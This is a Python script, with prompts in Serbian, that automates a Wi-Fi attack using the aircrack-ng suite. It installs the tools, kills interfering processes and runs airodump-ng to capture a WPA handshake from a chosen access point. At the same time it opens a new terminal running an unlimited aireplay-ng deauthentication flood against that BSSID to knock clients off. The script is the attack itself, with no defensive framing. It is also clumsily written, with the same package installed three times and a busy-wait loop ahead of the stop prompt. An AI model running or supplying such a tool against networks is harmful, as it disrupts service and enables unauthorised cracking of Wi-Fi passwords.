import subprocess
import threading


def run_command(command):
    subprocess.run(command.split())


def install_dependencies():
    # Install Airodump-ng
    run_command("sudo apt install aircrack-ng")

    # Install Airmon-ng
    run_command("sudo apt install aircrack-ng")

    # Install Aireplay-ng
    run_command("sudo apt install aircrack-ng")

    # Install Gnome Terminal
    run_command("sudo apt install gnome-terminal")


def capture_handshake(interface, filename, bssid, channel):
    run_command(f"sudo airodump-ng -w {filename} -c {channel} --bssid {bssid} {interface}")


# Install dependencies
install_dependencies()


# Display wireless network information
run_command("iwconfig")


# Kill interfering processes
run_command("sudo airmon-ng check kill")


# Ask user for interface name
interface = input("Uneti interface ime: ")


# Ask user for filename
filename = input("Uneti filename: ")


# Run airodump-ng on the specified interface
run_command(f"sudo airodump-ng {interface}")


# Ask user for desired BSSID
bssid = input("Uneti BSSID: ")


# Ask user for desired channel
channel = input("Uneti channel: ")


# Start capturing handshake in a separate thread
capture_thread = threading.Thread(target=capture_handshake, args=(interface, filename, bssid, channel))
capture_thread.start()


# Open a new terminal and run deauthentication command
deauth_command = f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"
subprocess.Popen(["gnome-terminal", "--", "bash", "-c", deauth_command])

while capture_thread.is_alive():
    pass


# Wait for the user to finish capturing handshake
input("Pritisnite stop da zaustavite handshake...")


# Stop monitor mode on the specified interface
run_command(f"sudo airmon-ng stop {interface}")


print("Monitor mode iskljucen")
